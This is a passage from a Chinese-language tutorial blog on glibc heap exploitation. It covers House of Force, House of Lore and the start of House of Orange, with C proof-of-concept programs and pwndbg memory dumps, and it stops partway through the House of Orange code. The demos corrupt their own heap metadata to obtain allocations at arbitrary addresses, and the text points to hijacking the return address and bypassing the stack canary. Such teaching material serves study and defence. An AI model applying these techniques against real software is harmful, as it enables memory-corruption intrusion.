&#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555559290 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0, </span><br><span class="line">  mchunk_size &#x3D; 273, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x5555555593a0 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0, </span><br><span class="line">  mchunk_size &#x3D; 134241, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40xg 0x555555559290</span><br><span class="line">0x555555559290:0x00000000000000000x0000000000000111</span><br><span class="line">0x5555555592a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592b0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593a0:0x00000000000000000x0000000000020c61 &lt;&#x3D;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure></div><h4 id="2-溢出修改top-chunk-size"><a href="#2-溢出修改top-chunk-size" class="headerlink" title="2 溢出修改top chunk size"></a>2 溢出修改top chunk size</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40xg 0x555555559290</span><br><span class="line">0x555555559290:0x00000000000000000x0000000000000111</span><br><span class="line">0x5555555592a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592b0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593a0:0x00000000000000000xffffffffffffffff &lt;&#x3D;&#x3D;&#x3D;&#x3D; 修改top chunk size为极大值</span><br><span class="line">0x5555555593b0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="抬高malloc到目标buffer"><a href="#抬高malloc到目标buffer" class="headerlink" title="抬高malloc到目标buffer"></a>抬高malloc到目标buffer</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">malloc 0xffffffffffffeef0 bytes.</span><br></pre></td></tr></table></figure></div><h4 id="malloc并strcpy覆写"><a href="#malloc并strcpy覆写" class="headerlink" title="malloc并strcpy覆写"></a>malloc并strcpy覆写</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">... old string: 这里是将要被覆写的字符串.</span><br><span class="line">... 使用 strcpy 覆写 &quot;YEAH!!!&quot;...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></table></figure></div><h3 id="Glibc-2-27-1"><a href="#Glibc-2-27-1" class="headerlink" title="Glibc 2.27"></a>Glibc 2.27</h3><p>目前在glibc2.27上仍然可以利用，而2.29版本则已有缓解措施</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">size</span> &gt; av-&gt;system_mem))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): corrupted top size"</span>);</span><br></pre></td></tr></table></figure></div><h2 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House of lore"></a>House of lore</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>创建两个chunk，第一个用于进入smallbin中，第二个用来防止free后被top chunk合并，free第一块，将其送入unsortedbin链表，再次申请一个size位于largebin中，并且在unsortedbin中没有与其匹配的chunk，系统接下来会把unsortedbin中的chunk加入到smallbin中。假设可以控制 第一个chunk的fd、bk指针，我们就可以在栈上伪造出一个smallbin的链表，再次malloc时，就可以从smallbin的链表末尾取chunk了。这样就可以在栈上创造chunk。</p><h3 id="Poc-2"><a href="#Poc-2" class="headerlink" title="Poc"></a>Poc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> &#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> prev_size;</span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> *<span class="title">fd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> *<span class="title">bk</span>;</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x64</span>];               <span class="comment">// 填充 smallbin size大小的chunk</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> <span class="title">fake_chunk</span>, <span class="title">another_fake_chunk</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> *<span class="title">real_chunk</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *ptr, *victim;</span><br><span class="line">  <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"House of lore Poc\n\n"</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fake_chunk地址:  %p\n\n"</span>, &amp;fake_chunk);</span><br><span class="line">  len = <span class="keyword">sizeof</span>(struct small_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"申请两个small chunk，释放第一个，该块会并入unsorted bin\n"</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(len);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第一块small chunk地址:  %p\n\n"</span>, ptr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第二块大小可以为任意值，只是为了防止第一块free后与top chunk合并\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第二块small chunk地址:  %p\n\n"</span>, <span class="built_in">malloc</span>(len));</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line">  real_chunk = (struct small_chunk *)(ptr - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第一块目前的地址:  %p\n\n"</span>, real_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"再申请一个chunk，size大于之前chunk以防被分配到同一个位置\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"之前free的chunk现在进入small bin\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第三块small chunk地址:  %p\n\n"</span>, <span class="built_in">malloc</span>(len + <span class="number">0x10</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"使第一块small chunk的bk指针指向&amp;fake_chunk,fake chunk将被插入smallbin\n"</span>);</span><br><span class="line">  real_chunk-&gt;bk = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"使fake_chunk的fd指针指向第一块small chunk\n"</span>);</span><br><span class="line">  fake_chunk.fd = real_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"绕过 \'victim-&gt;bk-&gt;fd == victim\' 检测\n"</span>);</span><br><span class="line">  fake_chunk.bk = &amp;another_fake_chunk;</span><br><span class="line">  another_fake_chunk.fd = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"重新申请第一块,地址为:  %p\n"</span>, <span class="built_in">malloc</span>(len));</span><br><span class="line"></span><br><span class="line">  victim = <span class="built_in">malloc</span>(len);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"再次申请得到fake_chunk,地址为  %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/28/ZCwxyNanpq6FdLM.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/28/ZCwxyNanpq6FdLM.png" class="lazyload"></a></p><h3 id="分步分析-2"><a href="#分步分析-2" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-申请两个small-chunk"><a href="#1-申请两个small-chunk" class="headerlink" title="1 申请两个small chunk"></a>1 申请两个small chunk</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(len);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第一块small chunk地址:  %p\n\n"</span>, ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第二块大小可以为任意值，只是为了防止第一块free后与top chunk合并\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第二块small chunk地址:  %p\n\n"</span>, <span class="built_in">malloc</span>(len));</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40xg 0x555555559420 -0x20</span><br><span class="line">0x555555559400:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559410:0x00000000000000000x0000000000000091 &lt;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x555555559420:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559430:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559440:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559450:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559460:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559470:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559480:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559490:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594a0:0x00000000000000000x0000000000000091 &lt;&#x3D;&#x3D;&#x3D; chunk2</span><br><span class="line">0x5555555594b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559500:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559510:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559520:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559530:0x00000000000000000x0000000000020ad1 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure></div><h4 id="2-释放chunk1"><a href="#2-释放chunk1" class="headerlink" title="2 释放chunk1"></a>2 释放chunk1</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40xg 0x555555559420 -0x20</span><br><span class="line">0x555555559400:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559410:0x00000000000000000x0000000000000091</span><br><span class="line">0x555555559420:0x00007ffff7fc4b380x00007ffff7fc4b38 &lt;&#x3D;&#x3D;&#x3D; 加入unsorted bin</span><br><span class="line">0x555555559430:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559440:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559450:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559460:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559470:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559480:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559490:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594a0:0x00000000000000900x0000000000000090</span><br><span class="line">0x5555555594b0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559520:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559530:0x00000000000000000x0000000000020ad1  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;|</span><br><span class="line">                                                                          |</span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x00007ffff7fc4b38                                         |</span><br><span class="line">0x7ffff7fc4b38 &lt;main_arena+88&gt;:0x00005555555595300x0000000000000000  &lt;&#x3D;|</span><br><span class="line">0x7ffff7fc4b48 &lt;main_arena+104&gt;:0x00005555555594100x0000555555559410 &lt;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x7ffff7fc4b58 &lt;main_arena+120&gt;:0x00007ffff7fc4b480x00007ffff7fc4b48</span><br><span class="line">0x7ffff7fc4b68 &lt;main_arena+136&gt;:0x00007ffff7fc4b580x00007ffff7fc4b58</span><br><span class="line">0x7ffff7fc4b78 &lt;main_arena+152&gt;:0x00007ffff7fc4b680x00007ffff7fc4b68</span><br><span class="line">0x7ffff7fc4b88 &lt;main_arena+168&gt;:0x00007ffff7fc4b780x00007ffff7fc4b78</span><br><span class="line">0x7ffff7fc4b98 &lt;main_arena+184&gt;:0x00007ffff7fc4b880x00007ffff7fc4b88</span><br><span class="line">0x7ffff7fc4ba8 &lt;main_arena+200&gt;:0x00007ffff7fc4b980x00007ffff7fc4b98</span><br><span class="line">0x7ffff7fc4bb8 &lt;main_arena+216&gt;:0x00007ffff7fc4ba80x00007ffff7fc4ba8</span><br><span class="line">0x7ffff7fc4bc8 &lt;main_arena+232&gt;:0x00007ffff7fc4bb80x00007ffff7fc4bb8</span><br></pre></td></tr></table></figure></div><h4 id="3-申请chunk3"><a href="#3-申请chunk3" class="headerlink" title="3 申请chunk3"></a>3 申请chunk3</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"第三块small chunk地址:  %p\n\n"</span>, <span class="built_in">malloc</span>(len + <span class="number">0x10</span>));</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40xg 0x555555559420 -0x20</span><br><span class="line">0x555555559400:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559410:0x00000000000000000x0000000000000091</span><br><span class="line">0x555555559420:0x00007ffff7fc4bb80x00007ffff7fc4bb8 &lt;&#x3D;&#x3D;&#x3D; chunk1加入small bin</span><br><span class="line">0x555555559430:0x00000000000000000x0000000000000000</span><br><span class="line">                        ...</span><br><span class="line">0x555555559490:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594a0:0x00000000000000900x0000000000000090</span><br><span class="line">0x5555555594b0:0x00000000000000000x0000000000000000</span><br><span class="line">                        ...</span><br><span class="line">0x555555559530:0x00000000000000000x00000000000000a1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x00007ffff7fc4bb8</span><br><span class="line">0x7ffff7fc4bb8 &lt;main_arena+216&gt;:0x00007ffff7fc4ba80x00007ffff7fc4ba8</span><br><span class="line">0x7ffff7fc4bc8 &lt;main_arena+232&gt;:0x00005555555594100x0000555555559410 &lt;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x7ffff7fc4bd8 &lt;main_arena+248&gt;:0x00007ffff7fc4bc80x00007ffff7fc4bc8</span><br><span class="line">0x7ffff7fc4be8 &lt;main_arena+264&gt;:0x00007ffff7fc4bd80x00007ffff7fc4bd8</span><br><span class="line">0x7ffff7fc4bf8 &lt;main_arena+280&gt;:0x00007ffff7fc4be80x00007ffff7fc4be8</span><br><span class="line">0x7ffff7fc4c08 &lt;main_arena+296&gt;:0x00007ffff7fc4bf80x00007ffff7fc4bf8</span><br><span class="line">0x7ffff7fc4c18 &lt;main_arena+312&gt;:0x00007ffff7fc4c080x00007ffff7fc4c08</span><br><span class="line">0x7ffff7fc4c28 &lt;main_arena+328&gt;:0x00007ffff7fc4c180x00007ffff7fc4c18</span><br><span class="line">0x7ffff7fc4c38 &lt;main_arena+344&gt;:0x00007ffff7fc4c280x00007ffff7fc4c28</span><br><span class="line">0x7ffff7fc4c48 &lt;main_arena+360&gt;:0x00007ffff7fc4c380x00007ffff7fc4c38</span><br></pre></td></tr></table></figure></div><h4 id="4-修改bk-fd指针，绕过检测"><a href="#4-修改bk-fd指针，绕过检测" class="headerlink" title="4 修改bk fd指针，绕过检测"></a>4 修改bk fd指针，绕过检测</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"使第一块small chunk的bk指针指向&amp;fake_chunk,fake chunk将被插入smallbin\n"</span>);</span><br><span class="line">real_chunk-&gt;bk = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"使fake_chunk的fd指针指向第一块small chunk\n"</span>);</span><br><span class="line">fake_chunk.fd = real_chunk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"绕过 \'victim-&gt;bk-&gt;fd == victim\' 检测\n"</span>);</span><br><span class="line">fake_chunk.bk = &amp;another_fake_chunk;</span><br><span class="line">another_fake_chunk.fd = &amp;fake_chunk;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40xg 0x555555559420 -0x20</span><br><span class="line">0x555555559400:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559410:0x00000000000000000x0000000000000091</span><br><span class="line">0x555555559420:0x00007ffff7fc4bb80x00007fffffffda70 &lt;&#x3D;&#x3D;&#x3D; fd-&gt;smallbin  bk-&gt;&amp;fake_chunk</span><br><span class="line">0x555555559430:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559490:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594a0:0x00000000000000900x0000000000000090</span><br><span class="line">0x5555555594b0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559520:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559530:0x00000000000000000x00000000000000a1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x00007fffffffda70</span><br><span class="line">0x7fffffffda70:0x00000380000003800x0000038000000380 &lt;&#x3D;&#x3D;&#x3D; fake_chunk</span><br><span class="line">0x7fffffffda80:0x00005555555594100x00007fffffffdb00 &lt;&#x3D;&#x3D;&#x3D; fd-&gt;chunk1  bk-&gt;&amp;another_fake_chunk</span><br><span class="line">0x7fffffffda90:0x00000380000003800x0000038000000380</span><br><span class="line">0x7fffffffdaa0:0x00000380000003800x0000038000000380</span><br><span class="line">0x7fffffffdab0:0x00000380000003800x0000038000000380</span><br><span class="line">0x7fffffffdac0:0x00000000000000000x0000004000000100</span><br><span class="line">0x7fffffffdad0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdae0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdaf0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdb00:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="5-malloc两次，成功将fake-chunk加入"><a href="#5-malloc两次，成功将fake-chunk加入" class="headerlink" title="5 malloc两次，成功将fake_chunk加入"></a>5 malloc两次，成功将fake_chunk加入</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"重新申请第一块,地址为:  %p\n"</span>, <span class="built_in">malloc</span>(len));</span><br><span class="line"></span><br><span class="line">victim = <span class="built_in">malloc</span>(len);</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/28/qKBpro1tkzEw2Ma.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/28/qKBpro1tkzEw2Ma.png" class="lazyload"></a></p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过house of lore，我们达到了任意地址分配内存的效果，就可以向chunk中写入数据来覆盖返回地址控制eip，甚至绕过 canary检查。</p><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>假设存在堆溢出可覆盖到 top chunk，设置top chunk+size页面对齐，设置prev_inuse位，然后申请一块比top chunk size大的块，使top chunk扩展。控制io_list_all，当malloc分割时，chunk-&gt;bk-&gt;fd的值会被libc的main_arena中的unsorted bin列表的地址覆盖。修改fd满足相应条件，设置跳板指针指向可控内存，malloc触发利用链。</p><h3 id="Poc-3"><a href="#Poc-3" class="headerlink" title="Poc"></a>Poc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"House of orange Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"首先申请一个chunk: p1 %p \n"</span>,p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"设置top chunk+size页面对齐，设置prev_inuse位\n\n"</span>);</span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"申请一个size大于top chunk的块，使其调用sysmalloc和_init_free\n\n"</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"p2 %p \n"</span>, p2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"chunk-&gt;bk-&gt;fd覆盖_IO_list_all指针\n\n"</span>);</span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"io_list_all现在指向chunk-&gt;bk-&gt;fd  %p \n"</span>, &amp;io_list_all);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"当malloc分割时，chunk-&gt;bk-&gt;fd的值会被libc的main_arena中的unsorted bin列表的地址覆盖。\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"设置chunk-&gt;bk为_IO_list_all - 16\n"</span>);</span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span 